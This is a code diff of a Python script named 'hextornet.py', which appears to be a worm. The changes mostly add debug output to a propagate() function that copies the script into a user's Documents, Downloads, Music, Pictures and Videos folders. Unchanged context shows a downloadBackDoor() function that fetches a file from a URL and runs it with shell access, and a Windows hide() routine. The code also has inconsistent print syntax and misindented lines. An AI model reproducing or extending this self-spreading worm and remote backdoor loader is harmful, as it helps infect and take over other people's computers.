@@ -11,6 +11,8 @@ from urllib2 import urlopen
 import subprocess as sp
 import shutil
 
+
+print(
 """
 [==========================]
 +                          +
@@ -18,7 +20,9 @@ import shutil
 +                          +
 [==========================]
 """
+)
 
+#Use in windows
 """
 	if(os.path.isdir("E:\\")):
 		dst = "E:" + "\\hextornet.py"
@@ -37,23 +41,19 @@ def propagate():
 
 	directoriesLinux = ["Documents", "Downloads", "Music", "Pictures", "Videos"]
 
-	dst=""
-
-	if(os.path.isdir("E:\\")):
-		dst = "E:" + "\\hextornet.py"
+	dst = ""
 
 	#Propagate worn in all directories
+	print("==========Worm location==========")
 	while len(directoriesLinux) != 0:
 		for directory in directoriesLinux:
 			if(os.path.isdir("/" + usr + "/" + directory + "/")):
 				dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
-			print(directoriesLinux)
+				print"dst:", dst
 			directoriesLinux.remove(directory)
         		copyfile(src, dst)
-	run(dst)
-	print("Worm location")
-	print("dst:", dst)
-	print("src:", src)
+			#run(dst) Run when use .exe 
+	print("=================================")
 
 def copy():
 	script = sys.argv
@@ -68,6 +68,7 @@ def copy():
 		except OSError as e:
 			os.chmod(directoryName, 0755)
 
+#Use in windows
 """
 def hide():
         for fname in os.listdir('.'):
@@ -93,8 +94,7 @@ def downloadBackDoor(url):
         run(os.path.abspath(filename))
 
 def run(program):
-	p= sp.Popen(program, shell=True)
-	#process = sp.Popen(program, shell=True)
+	process = sp.Popen(program, shell=True)
 	#process.wait()
 
 def main():
